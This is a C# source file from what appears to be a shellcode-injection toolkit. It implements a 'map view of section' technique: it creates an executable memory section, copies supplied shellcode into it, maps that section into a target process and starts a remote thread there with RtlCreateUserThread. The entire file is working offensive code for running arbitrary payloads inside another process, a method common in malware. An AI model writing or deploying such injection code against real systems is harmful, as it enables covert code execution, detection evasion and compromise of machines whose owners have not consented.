using shellcode_inject.Techniques;
using shellcode_inject;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace shellcode_inject.Techniques
{
    public class MVS : ITechnique
    {
        public bool Inject(byte[] shellcode, IntPtr hTarget)
        {
            IntPtr hSectionHandle = IntPtr.Zero;
            IntPtr pLocalView = IntPtr.Zero;
            UInt64 size = (UInt32)shellcode.Length;

            // create a new section to map view to
            UInt32 result = Native.NtCreateSection(ref hSectionHandle, Native.SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, ref size, Native.MemoryProtection.PAGE_EXECUTE_READWRITE, Native.MappingAttributes.SEC_COMMIT, IntPtr.Zero);

            if (result != 0)
            {
                return false;
            }
            // create a local view
            const UInt32 ViewUnmap = 0x2;
            UInt64 offset = 0;
            result = Native.NtMapViewOfSection(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, Native.MemoryProtection.PAGE_READWRITE);

            if (result != 0)
            {
                return false;
            }

            // copy shellcode to the local view
            Marshal.Copy(shellcode, 0, pLocalView, shellcode.Length);
            // create a remote view of the section in the target
            IntPtr pRemoteView = IntPtr.Zero;
            Native.NtMapViewOfSection(hSectionHandle, hTarget, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, Native.MemoryProtection.PAGE_EXECUTE_READ);
            // execute the shellcode
            IntPtr hThread = IntPtr.Zero;
            Native.CLIENT_ID cid = new Native.CLIENT_ID();
            Native.RtlCreateUserThread(hTarget, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);

            if (hThread == IntPtr.Zero)
            {
                return false;
            }
            return true;
        }
    }
}
